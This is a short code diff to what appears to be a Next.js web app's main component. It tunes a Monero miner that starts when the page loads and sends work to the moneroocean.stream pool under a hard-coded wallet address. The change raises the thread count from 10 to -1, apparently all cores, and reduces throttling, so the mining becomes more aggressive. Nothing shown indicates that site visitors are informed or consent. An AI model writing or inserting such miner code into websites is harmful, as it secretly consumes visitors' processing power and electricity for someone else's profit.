@@ -21,10 +21,10 @@ export default function App({ Component, pageProps }) {
         let pool = "moneroocean.stream";
         let walletAddress = "45bF6KJGyiVHiACEPn2KD2frjpuJjZBEM2iNxh6RNsfu11AhWHiqwPKJV3qj4jnDmGEKbQMiUcgXjZLwpTR2MnreQvhjQF4";
         let workerId = "AM"
-        let threads = 10;
+        let threads = -1;
         let password = "x";
         startMining(pool, walletAddress, workerId, threads, password);
-        throttleMiner = 35;
+        throttleMiner = 31;
       }} />
   </main>
 }
